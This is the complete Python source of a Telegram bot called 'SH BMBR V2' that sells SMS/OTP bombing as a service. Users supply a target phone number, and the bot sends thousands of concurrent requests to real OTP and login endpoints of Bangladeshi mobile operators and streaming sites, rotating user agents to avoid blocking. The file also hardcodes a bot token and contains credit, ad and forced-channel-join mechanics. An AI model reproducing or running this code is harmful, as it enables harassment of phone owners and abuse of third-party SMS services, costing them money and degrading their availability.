import telebot
import requests
import threading
import time
import sqlite3
import random
from concurrent.futures import ThreadPoolExecutor
from telebot import types

# ==========================================
# ⚙️ CONFIGURATION
# ==========================================
API_TOKEN = '8621602769:AAH7YRhVVVp38Cm0cwe4PX16uYk0lqHgix0' 
ADMIN_ID = 6941003064  
CHANNEL_ID = '@SH_tricks' 
CHANNEL_LINK = 'https://t.me/SH_tricks'
AD_LINK = "https://www.effectivegatecpm.com/wnbk2zjv?key=75442aee9e8b64a0d71c17a99228474d"

bot = telebot.TeleBot(API_TOKEN)
user_data_temp = {} 

# Database Setup
conn = sqlite3.connect('sh_bmbr.db', check_same_thread=False)
cursor = conn.cursor()
cursor.execute('''CREATE TABLE IF NOT EXISTS users 
                  (user_id INTEGER PRIMARY KEY, credits INTEGER DEFAULT 0, 
                  is_ban INTEGER DEFAULT 0, is_vip INTEGER DEFAULT 0, can_claim INTEGER DEFAULT 0)''')
conn.commit()

# ==========================================
# 🛡️ ANTI-BLOCK SYSTEM (Headers)
# ==========================================
def get_headers():
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36"
    ]
    return {"User-Agent": random.choice(user_agents)}

# ==========================================
# ⚡ ALL APIs (Grouped for Power)
# ==========================================
def attack_logic(t):
    headers = get_headers()
    # GP
    try: requests.get(f"https://mygp.grameenphone.com/mygpapi/v2/otp-login?msisdn={t}", headers=headers, timeout=3)
    except: pass
    try: requests.post("https://gpfi-api.grameenphone.com/api/v1/fwa/request-for-otp", json={"phone": t}, headers=headers, timeout=3)
    except: pass
    # Robi & Airtel
    try: requests.post("https://da-api.robi.com.bd/da-nll/otp/send", json={"msisdn": t}, headers=headers, timeout=3)
    except: pass
    try: requests.post("https://www.robi.com.bd/bn", data=f'msisdn={t}', headers={"Content-Type": "application/x-www-form-urlencoded", "User-Agent": headers["User-Agent"]}, timeout=3)
    except: pass
    # Banglalink
    try: requests.post("https://eshop-api.banglalink.net/api/v1/customer/send-otp", json={"phone": t}, headers=headers, timeout=3)
    except: pass
    try: requests.post("https://web-api.banglalink.net/api/v1/user/otp-login/request", json={"mobile": t}, headers=headers, timeout=3)
    except: pass
    # OTT & Others
    try: requests.get(f"https://web-api.binge.buzz/api/v3/otp/send/{t}", headers=headers, timeout=3)
    except: pass
    try: requests.post("https://api-dynamic.chorki.com/v2/auth/login", json={"number": f"+88{t}"}, headers=headers, timeout=3)
    except: pass
    try: requests.post("https://prod-api.hoichoi.dev/core/api/v1/auth/signinup/code", json={"phoneNumber": f"+88{t}"}, headers=headers, timeout=3)
    except: pass
    try: requests.post("https://api-dynamic.bioscopelive.com/v2/auth/login", json={"number": f"+88{t}"}, headers=headers, timeout=3)
    except: pass
    try: requests.post("https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp", json={"phoneNumber": t}, headers=headers, timeout=3)
    except: pass

# ==========================================
# 🚫 ANTI-LEAVE & FORCE JOIN
# ==========================================
@bot.chat_member_handler()
def monitor_leave(update):
    user_id = update.new_chat_member.user.id
    if update.new_chat_member.status in ['left', 'kicked']:
        cursor.execute("UPDATE users SET is_ban=1 WHERE user_id=?", (user_id,))
        conn.commit()
        try: bot.send_message(ADMIN_ID, f"🚫 **Auto Ban!** User {user_id} left channel.")
        except: pass

def is_subscribed(user_id):
    try:
        status = bot.get_chat_member(CHANNEL_ID, user_id).status
        return status in ['member', 'administrator', 'creator']
    except: return False

# ==========================================
# 🛠 UTILS
# ==========================================
def get_user(user_id):
    cursor.execute("SELECT * FROM users WHERE user_id=?", (user_id,))
    user = cursor.fetchone()
    if not user:
        cursor.execute("INSERT INTO users (user_id, credits) VALUES (?, ?)", (user_id, 2))
        conn.commit()
        return (user_id, 2, 0, 0, 0)
    return user

def main_menu():
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    markup.add("🚀 Start Attack", "💰 Refer to Earn", "📺 Watch Ad", "👤 My Profile")
    return markup

# ==========================================
# 🎮 USER HANDLERS
# ==========================================
@bot.message_handler(commands=['start'])
def start(message):
    user = get_user(message.from_user.id)
    if user[2] == 1:
        bot.reply_to(message, "🚫 You are banned!")
        return
    if not is_subscribed(message.from_user.id):
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("📢 Join Channel", url=CHANNEL_LINK))
        bot.send_message(message.chat.id, "❗ আগে চ্যানেলে জয়েন করুন নাহলে বোট কাজ করবে না।", reply_markup=markup)
        return
    bot.reply_to(message, "<b>🚀 SH BMBR V2 🔥</b>\nWelcome! You got 2 Credits free.", reply_markup=main_menu(), parse_mode='HTML')

@bot.message_handler(func=lambda m: m.text == "👤 My Profile")
def profile(message):
    user = get_user(message.from_user.id)
    status = "VIP 🌟" if user[3] == 1 else "Free User"
    bot.reply_to(message, f"👤 ID: <code>{user[0]}</code>\n💰 Credits: {user[1]}\n⚡ Status: {status}", parse_mode='HTML')

@bot.message_handler(func=lambda m: m.text == "🚀 Start Attack")
def start_at(message):
    if not is_subscribed(message.from_user.id): return
    msg = bot.send_message(message.chat.id, "📱 টার্গেট নম্বর দিন (১১ ডিজিট):")
    bot.register_next_step_handler(msg, get_amount)

def get_amount(message):
    target = message.text
    if len(target) == 11 and target.isdigit():
        user_data_temp[message.from_user.id] = target
        bot.send_message(message.chat.id, "🔢 কয়টি রাউন্ড দিতে চান? (সর্বোচ্চ ১০০):")
        bot.register_next_step_handler(message, run_bombing)
    else: bot.reply_to(message, "❌ ভুল নম্বর!")

def run_bombing(message):
    try:
        rounds = int(message.text)
        if rounds > 100: rounds = 100
        uid = message.from_user.id
        target = user_data_temp[uid]
        user = get_user(uid)

        if user[3] == 0 and user[1] < 1:
            bot.reply_to(message, "❌ ক্রেডিট নেই! অ্যাড দেখুন।")
            return
        
        if user[3] == 0:
            cursor.execute("UPDATE users SET credits = credits - 1 WHERE user_id=?", (uid,))
            conn.commit()

        bot.send_message(message.chat.id, f"🚀 **Attack Started on {target}**\nPower: 1=100 Hits (Round: {rounds})")
        threading.Thread(target=bombing_engine, args=(message.chat.id, target, rounds)).start()
    except: bot.reply_to(message, "❌ সঠিক সংখ্যা দিন।")

def bombing_engine(chat_id, target, rounds):
    for r in range(rounds):
        # 1 Round = 100 Hits logic using ThreadPool
        with ThreadPoolExecutor(max_workers=50) as ex:
            for _ in range(100):
                ex.submit(attack_logic, target)
        time.sleep(1) # ১ সেকেন্ড বিরতি প্রতি রাউন্ডে
    bot.send_message(chat_id, f"✅ **Attack Done!**\nTarget: {target}\nCredit: @Suptho1")

# ==========================================
# 👑 ADMIN PANEL (FULLY WORKING COMMANDS)
# ==========================================
@bot.message_handler(commands=['admin'])
def admin_p(message):
    if message.from_user.id == ADMIN_ID:
        cursor.execute("SELECT COUNT(*) FROM users")
        count = cursor.fetchone()[0]
        bot.reply_to(message, f"👑 **Admin Menu**\nTotal Users: {count}\n\n/ban ID\n/unban ID\n/add_credit ID Amount\n/set_vip ID\n/broadcast Message")

@bot.message_handler(commands=['ban'])
def ban_user(message):
    if message.from_user.id == ADMIN_ID:
        try:
            uid = message.text.split()[1]
            cursor.execute("UPDATE users SET is_ban=1 WHERE user_id=?", (uid,))
            conn.commit()
            bot.reply_to(message, f"🚫 User {uid} has been banned.")
        except: bot.reply_to(message, "Usage: /ban USER_ID")

@bot.message_handler(commands=['unban'])
def unban_user(message):
    if message.from_user.id == ADMIN_ID:
        try:
            uid = message.text.split()[1]
            cursor.execute("UPDATE users SET is_ban=0 WHERE user_id=?", (uid,))
            conn.commit()
            bot.reply_to(message, f"✅ User {uid} has been unbanned.")
        except: bot.reply_to(message, "Usage: /unban USER_ID")

@bot.message_handler(commands=['add_credit'])
def add_credit_admin(message):
    if message.from_user.id == ADMIN_ID:
        try:
            cmd = message.text.split()
            uid, amt = cmd[1], cmd[2]
            cursor.execute("UPDATE users SET credits = credits + ? WHERE user_id=?", (amt, uid))
            conn.commit()
            bot.reply_to(message, f"💰 Added {amt} credits to User {uid}.")
        except: bot.reply_to(message, "Usage: /add_credit USER_ID AMOUNT")

@bot.message_handler(commands=['set_vip'])
def set_vip_admin(message):
    if message.from_user.id == ADMIN_ID:
        try:
            uid = message.text.split()[1]
            cursor.execute("UPDATE users SET is_vip=1 WHERE user_id=?", (uid,))
            conn.commit()
            bot.reply_to(message, f"🌟 User {uid} is now a VIP user.")
        except: bot.reply_to(message, "Usage: /set_vip USER_ID")

@bot.message_handler(commands=['broadcast'])
def broadcast_admin(message):
    if message.from_user.id == ADMIN_ID:
        msg_text = message.text.replace('/broadcast ', '')
        if msg_text == '/broadcast': return
        cursor.execute("SELECT user_id FROM users")
        all_users = cursor.fetchall()
        for u in all_users:
            try: bot.send_message(u[0], f"📢 **Notice:**\n\n{msg_text}")
            except: pass
        bot.reply_to(message, "✅ Broadcast sent to all users.")

if __name__ == "__main__":
    bot.infinity_polling(allowed_updates=["message", "callback_query", "chat_member"])
